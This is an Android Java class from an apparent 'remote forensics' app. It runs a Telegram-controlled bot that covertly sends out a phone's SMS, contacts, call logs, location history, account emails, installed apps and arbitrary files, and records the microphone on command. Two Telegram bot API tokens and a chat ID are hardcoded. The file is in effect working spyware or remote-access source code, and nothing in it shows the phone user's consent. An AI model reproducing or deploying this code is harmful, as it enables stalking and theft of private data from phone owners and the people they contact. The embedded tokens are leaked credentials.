package com.peritoflores.androidremoteforensics;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import java.util.Calendar;

import com.peritoflores.androidremoteforensics.ahm.CallsManager;
import com.peritoflores.androidremoteforensics.ahm.CameraManager;
import com.peritoflores.androidremoteforensics.ahm.ContactsManager;
import com.peritoflores.androidremoteforensics.ahm.MicManager;
import com.peritoflores.androidremoteforensics.ahm.SMSManager;
import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.UpdatesListener;
import com.pengrad.telegrambot.model.Message;
import com.pengrad.telegrambot.model.Update;
import com.pengrad.telegrambot.request.GetUpdates;
import com.pengrad.telegrambot.request.SendAudio;
import com.pengrad.telegrambot.request.SendDocument;
import com.pengrad.telegrambot.request.SendLocation;
import com.pengrad.telegrambot.request.SendMessage;
import com.pengrad.telegrambot.request.SendPhoto;
import com.pengrad.telegrambot.response.GetUpdatesResponse;
import com.pengrad.telegrambot.response.SendResponse;
import com.scottyab.rootbeer.RootBeer;

import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.util.List;


public class EchoBot extends AsyncTask<Void, Integer, Boolean> {

    DatabaseHelper mydb;
    static String TelegramBotApiToken = "5013004214:AAEzKp7iq9g5sry4p0C6o5LvaDmZ6WooQ9c";

    CameraManager cm;
    GPSTracker gps;


    static TelegramBot bot = new TelegramBot(TelegramBotApiToken);


    static String DEFAULT_PATH = "/";
    //esto representa la lista de comandos que tiene el bot
    static String[] COMMANDS = {"smslist", "getcallslogs", "getcontacts", "isrooted", "getcurrentlocation", "getlocationhistory", "getlistofinstalledapps", "getbatterylevel", "download", "ls", "recordaudio"};
    static String[] COMMANDS_DESCRIPTION = {"obtiene lista de SMS", "obtiene lista de llamadas", "obtiene contactos", "identifica si el telefono ha sido rooteado", "obtiene ubicacion actual", "obtiene historial de ubicaciones", "obtiene la lista de aplicaciones instaladas", "obtiene nivel de bateria", "descarga archivo", "lista archivos", "graba sonido desde microfono por x segundos"};

    static int MIN_RECORDING_TIME = 10;
    static int DEFAULT_RECORDING_TIME = 60;
    static int MAX_RECORDING_TIME = 120;

    static int SECONDS_EVERY_INFO = 60;
    AppUtils apputils;
    Context ctx;
    long chatId;

    static final String TAG = "EchoBot";


    static int MAX_MESSAGE_SIZE = 4096;

    public void sendPhoto(Object o) {


    }

    public static String getCommandsandDescriptions() {
        String result = "";
        for (int i = 0; i < COMMANDS.length; i++) {
            result = result + COMMANDS[i] + " - " + COMMANDS_DESCRIPTION[i] + "\n";
        }
        return result;
    }


    public static void sendDocument(long chatId, File document) {
        //This code will divide string in several same size arrays in order to be able to send to telegram
        bot.execute(new SendDocument(chatId, document));
    }

    public static void sendPhoto(long chatId, String pathname) {
        //This code will divide string in several same size arrays in order to be able to send to telegram
        File f = new File(pathname);
        bot.execute(new SendPhoto(chatId, f));
    }

    public static void sendVoice(long chatId, String pathname) {
        //This code will divide string in several same size arrays in order to be able to send to telegram
        File f = new File(pathname);
        bot.execute(new SendAudio(chatId, f));
    }

    public SendResponse sendFragmentedMessage(long chatId, String message) {
        //This code will divide string in several same size arrays in order to be able to send to telegram
        SendResponse response = null;
        int messagelength = message.length();
        String tempmessage = message;
        String smallmessage;
        while (messagelength > 0) {
            if (messagelength > MAX_MESSAGE_SIZE) {
                smallmessage = tempmessage.substring(0, MAX_MESSAGE_SIZE);
                tempmessage = tempmessage.substring(MAX_MESSAGE_SIZE, messagelength);
                messagelength = messagelength - MAX_MESSAGE_SIZE;
            } else {
                smallmessage = tempmessage;
                messagelength = 0;
            }

            response = bot.execute(new SendMessage(chatId, smallmessage));
        }
        return response;

    }


    private void getChatId() {
        long chatId = 0;
        chatId = 429251491;  //este numero hay que modificarlo con el ID
        // del telegram del perito .  Se puede ver en @get_id_bot
        while (chatId == 0) {
            Log.d(TAG, "Trying to get CHAT id");
            GetUpdates getUpdates = new GetUpdates().limit(100).offset(0).timeout(0);
            GetUpdatesResponse updatesResponse = bot.execute(getUpdates);
            List<Update> updates = updatesResponse.updates();
            Log.d(TAG, "updates size:" + updates.size());
            if (updates != null && updates.size() > 0) {
                int size = updates.size();
                Update update = updates.get(size - 1);
                chatId = update.message().chat().id();
            }
            try {
                Thread.sleep(5000);
            } catch (InterruptedException ie) {
                Log.e(TAG, "Se ha interrumpido el thread para obtener el chatid");
            }
        }
        this.chatId = chatId;
        Log.d(TAG, "setting chatId: " + this.chatId);
    }

    private void sendLocationHistory() {
        Cursor res = mydb.getLocationHistory();
        int size = res.getCount();
        Log.d("TAG", "Database location history size is " + size);
        StringBuffer text = new StringBuffer();
        while (res.moveToNext()) {
            long dateinmilis = res.getLong(1);
            java.util.Date date = new java.util.Date(dateinmilis);
            float latitude = res.getFloat(2);
            float longitude = res.getFloat(3);
            text.append("DateTime:" + date + "Lat:" + latitude + "Long" + longitude + "\n");
        }
        sendFragmentedMessage(chatId, text.toString());
    }

    private void sendCurrentLocation() {
        SendResponse response;

        Location pos = gps.getLocation();
        if (pos != null) {
            response = bot.execute(new SendLocation(chatId, (float) pos.getLatitude(), (float) pos.getLongitude()));
        } else {
            response = bot.execute(new SendMessage(chatId, "no location is available"));
        }
    }

    private void sendAllData() {
        SendResponse response;
        StringBuffer documenttext = new StringBuffer();
        File document = new File(Environment.getExternalStorageDirectory() + "info.txt");
        if (this.chatId != 0) {
            response = bot.execute(new SendMessage(chatId, "Nuevo Dispositivo conectado!"));

            try {
                Log.d(TAG, "SMS");
                String smslist = SMSManager.getSMSList(ctx).toString();
                documenttext.append(smslist);
                //this.sendMessage(chatId,smslist);
            } catch (Exception e) {
                Log.e(TAG, e.toString());
            }
            try {
                FileWriter fw = new FileWriter(document);
                fw.write(documenttext.toString());
                fw.close();
                EchoBot.sendDocument(chatId, document);
            } catch (Exception e2) {
                Log.e(TAG, e2.toString());
            }
        }
    }

    @Override
    protected Boolean doInBackground(Void... params) {
        Log.i(TAG, "in do in background");
        getChatId();
        setlistener();
        while (!this.isCancelled()) {
            //sendAllData();
            if (ctx == null) {
                Log.d(TAG, "CTX is null");
                sendFragmentedMessage(chatId, "CTX is null");
            }

            java.util.Date currentTime;
            currentTime = Calendar.getInstance().getTime();
            Location location = gps.getLocation();
            if (location != null) {
                mydb.saveLocation(currentTime, location);
            } else
                Log.d(TAG, "No current location available");
            if (!haveNetworkConnection()) {
                Log.d(TAG, "No internet connection");
            } else {
                String phoneDescription = apputils.getPhoneDescription();
                String accountsAsociated = apputils.getEmails();
                try {
                    bot.execute(new SendMessage(chatId, "I am alive " + phoneDescription + accountsAsociated));
                    //bot.execute(new SendMessage(chatId));
                } catch (Exception e) {
                    Log.e("ERROR:", "Hubo un error en bot.execute");
                }
                Log.d(TAG, "Sending alive message");
            }


            try {
                Thread.sleep((SECONDS_EVERY_INFO) * 1000); //-1 is for more accuren
            } catch (InterruptedException ie) {
                Log.d(TAG, "Thread interrupted");
            }
        }
        return true;
    }

    private boolean haveNetworkConnection() {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }

    public EchoBot(Context ctx) {
        //https://api.telegram.org/733854502:AAGC6HbsUig50-wb8-kIfT1MeT4wRrO4w40/getUpdates
        this.ctx = ctx;
        this.gps = new GPSTracker(ctx);
        this.cm = new CameraManager(ctx);
        this.apputils = new AppUtils(ctx);
        //esta linea para cuando configure en string.xmls debo retocar todo para que no quede estático
        //this.TelegramBotApiToken=ctx.getResources().getString(R.string.TelegramBotApiToken);
        mydb = new DatabaseHelper(ctx);
    }


    public void setlistener() {


        bot.setUpdatesListener(new UpdatesListener() {
            @Override
            public int process(List<Update> updates) {
                Log.d(TAG, "in process listener");
                for (Update update : updates) {
                    try {
                        Message msg = update.message();

                        if (msg != null && msg.text() != null) {
                            String txt = msg.text();
                            Log.d(TAG, txt);
                            if (txt.trim().startsWith("/smslist")) {
                                Log.d(TAG, "SMS command..");
                                String[] data = txt.split(" ");
                                if (data.length != 1) {
                                    Log.d(TAG, "Command format error");
                                    return UpdatesListener.CONFIRMED_UPDATES_ALL;
                                }
                                String smslist = SMSManager.getSMSList(ctx).toString();
                                //documenttext.append(smslist);
                                sendFragmentedMessage(chatId, smslist);

                            } else if ((txt.trim().startsWith("/getcontacts"))) {
                                String contacts = ContactsManager.getContacts(ctx).toString();

                                Log.d(TAG, "Contacts commands");
                                sendFragmentedMessage(chatId, contacts);
                                //bot.execute(new SendMessage(chatId,contacts))   ;

                            } else if ((txt.trim().startsWith("/getcallslogs"))) {
                                JSONObject callsLogs = CallsManager.getCallsLogs(ctx);


                                Log.d(TAG, "Call Logs commands");
                                sendFragmentedMessage(chatId, callsLogs.toString());
                                //bot.execute(new SendMessage(chatId,callsLogs.toString()))   ;

                            } else if ((txt.trim().startsWith("/getcurrentlocation"))) {
                                sendCurrentLocation();
                            } else if ((txt.trim().startsWith("/getlocationhistory"))) {
                                sendLocationHistory();
                            } else if ((txt.trim().startsWith("/getbatterylevel"))) {

                                bot.execute(new SendMessage(chatId, "Battery level " + Integer.toString(apputils.getBatteryLevel()) + "%"));


                            } else if ((txt.trim().startsWith("/download"))) {

                                String[] data = txt.split(" ");
                                if (data.length != 2) {
                                    Log.d(TAG, "Command format error");
                                    sendFragmentedMessage(chatId, "Necesita ingresar el archivo a descargar");
                                    //return UpdatesListener.CONFIRMED_UPDATES_ALL;
                                } else {
                                    String filepath = data[1];
                                    bot.execute(new SendDocument(chatId, new File(filepath)));
                                }
                            } else if ((txt.trim().startsWith("/isrooted"))) {
                                RootBeer rootBeer = new RootBeer(ctx);
                                if (rootBeer.isRooted()) {
                                    sendFragmentedMessage(chatId, "Rooted");
                                } else {
                                    sendFragmentedMessage(chatId, "Non Rooted");
                                }
                            } else if ((txt.trim().startsWith("/getcontacts"))) {
                                String contacts = ContactsManager.getContacts(ctx).toString();

                                Log.d(TAG, "Contacts commands");
                                sendFragmentedMessage(chatId, contacts);
                                //bot.execute(new SendMessage(chatId,contacts))   ;

                            } else if ((txt.trim().startsWith("/ls"))) {
                                String filepath;
                                String[] data = txt.split(" ");
                                if (data.length > 2) {
                                    Log.d(TAG, "Command format error");
                                    //return UpdatesListener.CONFIRMED_UPDATES_ALL;
                                } else {

                                    if (data.length == 1) {

                                        filepath = DEFAULT_PATH;
                                    } else {
                                        filepath = data[1];
                                    }
                                    bot.execute(new SendMessage(chatId, apputils.getFileList(filepath).toString()));
                                }

                            } else if ((txt.trim().startsWith("/getphonedescription"))) {
                                bot.execute(new SendMessage(chatId, apputils.getPhoneDescription()));
                            } else if ((txt.trim().startsWith("/getwifistatus"))) {
                                bot.execute(new SendMessage(chatId, apputils.getWifiStatus()));
                            } else if ((txt.trim().startsWith("/getemails"))) {
                                bot.execute(new SendMessage(chatId, apputils.getEmails()));
                            } else if ((txt.trim().startsWith("/getlistofinstalledapps"))) {
                                sendFragmentedMessage(chatId, apputils.getListOfInstalledApps().toString());
                            } else if ((txt.trim().startsWith("/recordaudio"))) {
                                String[] data = txt.split(" ");
                                if (data.length == 2) {
                                    int seconds = Integer.valueOf(data[1]);
                                    if (seconds >= MIN_RECORDING_TIME && seconds <= MAX_RECORDING_TIME) {
                                        MicManager.startRecording(seconds, chatId);
                                    } else {
                                        sendFragmentedMessage(chatId, "Recording must be between " + MIN_RECORDING_TIME + " and " + MAX_RECORDING_TIME + " seconds");

                                    }
                                }
                            } else {
                                bot.execute(new SendMessage(chatId, "No entiendo ese mensaje \n" + getCommandsandDescriptions()));
                                //  bot.execute(new SendMessage(chatId,getCommandsandDescriptions()));
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, e.toString());
                        //sendFragmentedMessage(chatId,e.toString());
                    }
                }
                return UpdatesListener.CONFIRMED_UPDATES_ALL;
            }
        });

    }


}
